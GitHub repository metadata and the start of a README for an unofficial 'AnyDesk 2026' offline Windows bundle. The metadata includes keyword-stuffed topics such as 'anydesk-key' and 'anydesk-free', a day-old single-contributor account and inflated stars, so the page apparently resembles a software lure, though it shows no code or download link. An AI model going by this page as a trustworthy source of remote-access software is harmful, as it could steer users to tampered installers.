---
repo: "dionfoster-lab45/anydesk-desktop"
name: "anydesk-desktop"
description: "AnyDesk 2026 standalone bundle with offline deployment path, portable mode, session handoff and multilingual runtime for Windows 11"
readmeQualityOk: true
url: "https://github.com/dionfoster-lab45/anydesk-desktop"
homepage: "https://dionfoster-lab45.github.io/anydesk-desktop/"
language: "C++"
languages: ["C++"]
languagePcts: [100]
topics: ["anydesk", "anydesk-2026", "anydesk-download", "anydesk-free", "anydesk-installer", "anydesk-key", "anydesk-latest-version", "anydesk-pro", "anydesk-setup", "anydesk-tool"]
stars: 115
forks: 0
openIssues: 0
closedIssues: 0
watchers: 0
contributors: 1
recentReleases: 0
createdAt: "2026-11-15T11:13:09Z"
lastCommitAt: "2026-11-16T04:25:53Z"
status: "newborn"
tags: []
healthScore: 77
undervaluedScore: 13
maintainers: ["dionfoster-lab45", "github-actions[bot]"]
openGraphImageUrl: "https://opengraph.githubassets.com/9f98b9aa84dd82777529553e89e30216e4731b0e6c2493bf4aaed40307a605aa/dionfoster-lab45/anydesk-desktop"
---

# 🔒 AnyDesk 2026: Standalone Offline Build for Windows 11

## 📦 Intro

This repository publishes a standalone offline Windows x64 distribution intended for the AnyDesk workflow, packaged so the entire runtime ships in a single self-contained setup tree. The build targets Windows 10 and 11 and does not require any online component after the initial retrieval step.

Offline deployment matters for air-gapped workstations, bandwidth-constrained environments, and reproducible installs where every artifact must be pinned to a known hash. This distribution is assembled for that scenario: one payload, one documented hash, no dependency on live vendor endpoints during rollout.

The package delivers a single `AnyDesk on Windows` deployment surface that covers both portable and installed modes, with the configuration directory kept separate from the program directory so both can be staged independently.

## 01 · ⬇️ Download

## 02 · ✨ Features

**📴 Offline Payload**

Single distribution package with all runtime components bundled, no live vendor endpoints required after retrieval.

**🔐 Hash Verification**

Each release publishes a SHA256 digest so staged rollouts can verify the artifact…
